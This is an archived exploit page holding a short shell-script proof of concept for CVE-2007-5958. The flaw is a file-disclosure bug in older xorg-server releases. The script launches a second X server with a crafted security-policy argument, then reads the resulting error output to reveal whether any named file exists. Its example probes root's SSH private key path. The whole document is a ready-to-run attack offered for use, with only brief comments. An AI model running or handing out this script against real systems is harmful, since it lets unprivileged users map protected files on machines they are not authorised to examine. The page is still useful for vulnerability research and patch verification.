<html><head><title>X.Org xorg-server <= 1.1.1-48.13 Probe for Files Exploit PoC</title></head><pre>#!/bin/sh
# Xorg file disclosure vulnerability (CVE-2007-5958)
#
# Lame xploit by vl4dZ :))
#
# sh-3.1$ whoami
# uid=1001(kecos) gid=1001(user) groups=1001(user)
# sh-3.1$ ./Xorg-File-Existence-PoC.sh /root/.ssh/id_dsa
# ...
# *** FILE /root/.ssh/id_dsa EXIST !! ***

# Vulnerable: xorg-server &lt;= 1.1.1-48.13

X_EXEC=/usr/bin/X
TMP_FILE=/tmp/X.$$

if [ &quot;$1&quot; = &quot;&quot; ]; then
   echo &quot;usage: $0 &lt;file&gt;&quot;
   exit 1
fi

[ -f ${X_EXEC} ] || (echo &quot;${X_EXEC} not found&quot;; exit 1)

echo -e &quot;\n** Xorg file disclosure vulnerability PoC (CVE-2007-5958) **\n&quot;
echo &quot;A second X server is going to be started, once started, type the &quot;
echo &quot;ctrl+Alt+Backspace sequence and you'll see the result of your request.&quot;
echo -en &quot;\nType [Enter] to start: &quot;; read

LANG=c ${X_EXEC} :1 -ac -sp $1 2&gt; ${TMP_FILE}

grep &quot;error opening security policy file&quot; ${TMP_FILE} &gt;/dev/null
if [ $? != 0 ]; then
   echo &quot;*** FILE $1 EXIST !! ***&quot;
else
   echo &quot;*** FILE $1 DOES NOT EXIST !! ***&quot;
fi
rm -f ${TMP_FILE}

echo -e &quot;\nCtrl-C to quit.&quot;
sleep 500

# milw0rm.com [2008-02-19]</pre></html>